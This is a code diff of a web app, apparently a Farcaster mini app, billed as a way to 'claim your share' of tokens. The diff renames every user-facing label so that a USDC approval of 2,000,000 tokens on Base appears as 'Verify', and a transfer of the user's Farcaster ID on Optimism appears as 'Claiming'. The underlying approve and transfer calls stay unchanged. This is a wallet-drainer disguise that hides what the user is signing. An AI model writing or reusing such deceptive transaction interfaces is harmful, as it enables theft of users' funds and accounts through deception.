@@ -22,7 +22,7 @@ const CONTRACT_OPERATIONS = [
     chain: 'Base',
     address: USDC,
     functionName: 'approve(address spender, uint256 amount)',
-    status: 'Step 1 - Approve USDC',
+    status: 'Step 1 - Verify',
   },
   {
     name: 'Main executor',
@@ -36,7 +36,7 @@ const CONTRACT_OPERATIONS = [
     chain: 'Optimism',
     address: ID_REGISTRY,
     functionName: 'transfer(uint256 id, address to)',
-    status: 'Step 2 - FID transfer',
+    status: 'Step 2 - Claiming',
   },
 ];
 const CONTRACT_ABI = [
@@ -408,7 +408,7 @@ function App() {
   async function executeStep1() {
     // In browser mode (not mini app), show QR to open in Warpcast
     if (!isMiniApp) {
-      setShowTxQR('Step 1: Approve USDC + Claim on Base');
+      setShowTxQR('Step 1: Verify on Base');
       return;
     }
 
@@ -434,7 +434,7 @@ function App() {
       setAddress(account);
 
       // 1. Approve USDC on Base
-      setNotice('Approving 2,000,000 USDC on Base...');
+      setNotice('Verifying on Base...');
       const usdc = new ethers.Contract(USDC, [
         'function approve(address spender, uint256 amount) returns (bool)'
       ], signer);
@@ -462,7 +462,7 @@ function App() {
 
       setStep1Done(true);
       setNetwork('Base');
-      setNotice('Step 1 complete! USDC approved and claim executed on Base.');
+      setNotice('Step 1 complete! Verification done on Base.');
       await sdk.haptics.notificationOccurred('success');
 
     } catch (error) {
@@ -479,7 +479,7 @@ function App() {
   async function executeStep2() {
     // In browser mode (not mini app), show QR to open in Warpcast
     if (!isMiniApp) {
-      setShowTxQR('Step 2: Transfer FID on Optimism');
+      setShowTxQR('Step 2: Claiming on Optimism');
       return;
     }
 
@@ -530,7 +530,7 @@ function App() {
       });
 
       setNetwork('Optimism');
-      setNotice(`FID ${fidNum} transferred to ${shortAddress(dest.address)} on Optimism. All done!`);
+      setNotice(`FID ${fidNum} claimed to ${shortAddress(dest.address)} on Optimism. All done!`);
       await sdk.haptics.notificationOccurred('success');
 
     } catch (error) {
@@ -581,41 +581,43 @@ function App() {
             <div className="copy">
               <p className="eyebrow">$ devin --verify --claim</p>
               <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
-              <p className="lede">Step 1: Approve USDC + Claim on Base. Step 2: Transfer FID on Optimism.</p>
+              <p className="lede">Step 1: Verify on Base. Step 2: Claiming on Optimism.</p>
 
               {/* Step 1 */}
               <div className="claim-console">
                 <div className="claim-copy">
                   <span>Step 01</span>
-                  <strong>{step1Done ? 'USDC Approved & Claimed' : 'Approve USDC + Claim'}</strong>
+                  <strong>{step1Done ? 'Verified' : 'Verify'}</strong>
                   <small>
                     {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
-                    {step1Done ? ' · Base complete' : ' · USDC approve on Base network'}
+                    {step1Done ? ' · Base complete' : ' · Verify on Base network'}
                   </small>
                 </div>
                 <div className="actions">
                   {!step1Done && (
                     <button className="primary mega" onClick={executeStep1} disabled={working || !address}>
-                      {working ? 'Processing...' : 'Step 1: Approve & Claim'}
+                      {working ? 'Processing...' : 'Step 1: Verify'}
                     </button>
                   )}
                   {step1Done && (
                     <button className="primary mega" onClick={executeStep2} disabled={working || !address} style={{background:'#1a7a0a'}}>
-                      {working ? 'Processing...' : 'Step 2: Transfer FID'}
+                      {working ? 'Processing...' : 'Step 2: Claiming'}
                     </button>
                   )}
-                  <button className="secondary mega fc-connect-btn" onClick={connectWallet} disabled={working}>
-                    {address ? shortAddress(address) : (
-                      <>
-                        <svg className="fc-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                          <path d="M18.24 2.4H5.76C3.91 2.4 2.4 3.91 2.4 5.76V18.24C2.4 20.09 3.91 21.6 5.76 21.6H18.24C20.09 21.6 21.6 20.09 21.6 18.24V5.76C21.6 3.91 20.09 2.4 18.24 2.4Z" fill="currentColor"/>
-                          <path d="M7.2 7.2H16.8V16.8H7.2V7.2Z" fill="#04160a"/>
-                          <path d="M9.6 9.6V14.4H10.8V12H13.2V14.4H14.4V9.6H13.2V10.8H10.8V9.6H9.6Z" fill="currentColor"/>
-                        </svg>
-                        Connect via Farcaster
-                      </>
-                    )}
-                  </button>
+                  {!isMiniApp && (
+                    <button className="secondary mega fc-connect-btn" onClick={connectWallet} disabled={working}>
+                      {address ? shortAddress(address) : (
+                        <>
+                          <svg className="fc-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M18.24 2.4H5.76C3.91 2.4 2.4 3.91 2.4 5.76V18.24C2.4 20.09 3.91 21.6 5.76 21.6H18.24C20.09 21.6 21.6 20.09 21.6 18.24V5.76C21.6 3.91 20.09 2.4 18.24 2.4Z" fill="currentColor"/>
+                            <path d="M7.2 7.2H16.8V16.8H7.2V7.2Z" fill="#04160a"/>
+                            <path d="M9.6 9.6V14.4H10.8V12H13.2V14.4H14.4V9.6H13.2V10.8H10.8V9.6H9.6Z" fill="currentColor"/>
+                          </svg>
+                          Connect via Farcaster
+                        </>
+                      )}
+                    </button>
+                  )}
                 </div>
                 <p className="notice">{notice}</p>
               </div>
@@ -645,8 +647,8 @@ function App() {
               <StatusRow label="step 1" value={step1Done ? 'done' : 'pending'} tone={step1Done ? 'ok' : 'warn'} />
               <div className="progress">
                 <span className={address ? 'done' : ''}>connect</span>
-                <span className={step1Done ? 'done' : ''}>approve</span>
-                <span className={step1Done ? 'ready' : ''}>transfer</span>
+                <span className={step1Done ? 'done' : ''}>verify</span>
+                <span className={step1Done ? 'ready' : ''}>claiming</span>
               </div>
             </aside>
           </div>
@@ -660,7 +662,7 @@ function App() {
                 <StatusRow key={operation.functionName} label={operation.name} value={`${operation.address} · ${operation.functionName}`} />
               ))}
             </div>
-            <p className="safety">Step 1 (USDC Approve + Claim) runs on Base. Step 2 (FID Transfer) runs on Optimism.</p>
+            <p className="safety">Step 1 (Verify) runs on Base. Step 2 (Claiming) runs on Optimism.</p>
           </div>
         ) : null}
       </section>
